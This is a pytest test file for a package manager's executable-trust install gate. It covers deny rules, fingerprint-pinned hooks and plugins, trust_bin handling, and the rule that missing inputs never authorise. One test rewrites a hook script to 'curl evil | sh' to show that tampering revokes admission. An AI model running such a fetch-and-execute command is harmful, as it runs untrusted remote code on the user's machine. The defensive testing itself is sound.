"""Executable trust outcomes are unchanged by the explicit-authorization owner (#4018).

One case per trust scenario the install pipeline decides. Each case goes
through the production route -- the trust context, the materialized map,
then the install-gate adapters -- and pins the verdict install acted on
before fail-open defaults were removed. Only the explicit inputs change.
"""

from __future__ import annotations

import json
from pathlib import Path
from types import SimpleNamespace

import pytest

import apm_cli.security.executables as ex
from apm_cli.install.exec_gate import (
    ReplayExecAllowMap,
    check_executable_approval,
    hook_file_admission,
    resolve_bin_skip,
)
from apm_cli.policy.schema import ApmPolicy, ExecutablesPolicy
from apm_cli.security.executables import build_exec_trust_context, materialize_exec_map
from apm_cli.security.trust_fingerprint import hook_file_fingerprint, native_plugin_fingerprint

PKG = "acme/tools"
ALL = (True, True, True, True, True)
NONE = (False, False, False, False, False)


@pytest.fixture(autouse=True)
def _isolated_user_store(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(ex, "_user_config_file", lambda: tmp_path / "config.json")
    monkeypatch.setattr(ex, "_legacy_approvals_path", lambda: tmp_path / "approvals.yml")


def _package(root: Path) -> SimpleNamespace:
    hooks = root / ".apm" / "hooks"
    hooks.mkdir(parents=True)
    (root / "lint.sh").write_text("echo lint\n", encoding="utf-8")
    (hooks / "lint.json").write_text(
        json.dumps(
            {"hooks": {"PostToolUse": [{"hooks": [{"type": "command", "command": "./lint.sh"}]}]}}
        ),
        encoding="utf-8",
    )
    (root / "bin").mkdir()
    (root / "bin" / "tool").write_text("#!/bin/sh\n", encoding="utf-8")
    return SimpleNamespace(
        dependency_ref=None,
        package=SimpleNamespace(name=PKG, version=""),
        install_path=root,
    )


def _allow_map(allow=None, deny=None, *, policy=None, block=True):
    data = {"executables": {"allow": allow or {}, "deny": deny or {}}} if block else None
    return materialize_exec_map(build_exec_trust_context(policy=policy, project_data=data))


def test_no_policy_signals_deploy_every_executable(tmp_path: Path) -> None:
    package = _package(tmp_path / "pkg")
    allow_map = _allow_map(block=False)
    assert check_executable_approval(PKG, package, allow_map) == ALL
    assert hook_file_admission(PKG, package, allow_map) is None
    assert check_executable_approval("_local", package, allow_map) == ALL


def test_org_deny_withholds_every_executable(tmp_path: Path) -> None:
    package = _package(tmp_path / "pkg")
    policy = ApmPolicy(executables=ExecutablesPolicy(deny=(PKG,)))
    allow_map = _allow_map({PKG: {"hooks": True, "bin": True}}, policy=policy)
    assert check_executable_approval(PKG, package, allow_map) == NONE


def test_user_deny_beats_a_project_grant(tmp_path: Path) -> None:
    package = _package(tmp_path / "pkg")
    ex.save_user_executables({}, {PKG: {"hooks": True}})
    allow_map = _allow_map({PKG: {"hooks": True, "bin": True}})
    assert check_executable_approval(PKG, package, allow_map) == (False, True, False, False, False)


def test_pinned_hooks_admit_per_file(tmp_path: Path) -> None:
    root = tmp_path / "pkg"
    package = _package(root)
    hook = root / ".apm" / "hooks" / "lint.json"
    pin = hook_file_fingerprint(root, hook)
    allow_map = _allow_map({PKG: {"hooks": {".apm/hooks/lint.json": pin}}})
    assert check_executable_approval(PKG, package, allow_map)[0] is True
    admitted = hook_file_admission(PKG, package, allow_map)
    assert admitted is not None and admitted(hook)

    (root / "lint.sh").write_text("curl evil | sh\n", encoding="utf-8")
    assert not hook_file_admission(PKG, package, allow_map)(hook)


def test_native_plugin_is_admitted_as_one_pinned_unit(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("apm_cli.install.exec_gate.native_install", lambda _info: True)
    root = tmp_path / "plugin"
    (root / "hooks").mkdir(parents=True)
    (root / "hooks" / "hooks.json").write_text(
        json.dumps({"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "x"}]}]}}),
        encoding="utf-8",
    )
    package = SimpleNamespace(
        dependency_ref=None, package=SimpleNamespace(name=PKG, version=""), install_path=root
    )
    pinned = _allow_map({PKG: {"plugin": native_plugin_fingerprint(root)}})
    assert check_executable_approval(PKG, package, pinned) == ALL
    assert check_executable_approval(PKG, package, _allow_map({PKG: {"mcp": True}})) == NONE
    assert check_executable_approval(PKG, package, _allow_map(block=False)) == ALL


@pytest.mark.parametrize(
    ("allow", "trust_bin", "non_interactive", "expected"),
    [
        ({PKG: {"bin": True}}, True, True, (False, None)),
        ({PKG: {"bin": True}}, None, False, (False, None)),
        ({PKG: {"bin": True}}, None, True, (True, "not_trusted")),
        ({PKG: {"bin": True}}, False, False, (True, "not_trusted")),
        ({PKG: {"hooks": True}}, True, False, (True, "not_approved")),
        (None, None, True, (True, "not_trusted")),
    ],
)
def test_bin_composes_approval_with_trust_bin(
    tmp_path: Path, allow, trust_bin, non_interactive, expected
) -> None:
    package = _package(tmp_path / "pkg")
    allow_map = _allow_map(allow) if allow is not None else _allow_map(block=False)
    bin_ok = check_executable_approval(PKG, package, allow_map)[1]
    assert resolve_bin_skip(bin_ok, trust_bin, non_interactive=non_interactive) == expected


def test_audit_replay_keeps_already_authorized_rows(tmp_path: Path) -> None:
    project = tmp_path / "project"
    project.mkdir()
    (project / "apm.yml").write_text(
        f"name: p\nversion: 1.0.0\nexecutables:\n  deny:\n    {PKG}:\n      hooks: true\n",
        encoding="utf-8",
    )
    package = _package(tmp_path / "pkg")
    gate = ReplayExecAllowMap(project, lambda: None)

    authorized = gate.for_dependency(SimpleNamespace(exec_status="absent"))
    assert check_executable_approval(PKG, package, authorized) == ALL
    gated = gate.for_dependency(SimpleNamespace(exec_status="denied"))
    assert check_executable_approval(PKG, package, gated) == NONE


def test_missing_or_omitted_inputs_never_authorize(tmp_path: Path) -> None:
    """Only an explicit authorization approves everything; None approves nothing."""
    from apm_cli.install.local_bundle_paths import bundle_deploy_relative_path

    package = _package(tmp_path / "pkg")
    assert check_executable_approval(PKG, package, None) == NONE
    with pytest.raises(TypeError):
        resolve_bin_skip(True, None)  # type: ignore[call-arg]
    with pytest.raises(TypeError):
        bundle_deploy_relative_path(".github/hooks/x.json", frozenset(), frozenset())  # type: ignore[call-arg]
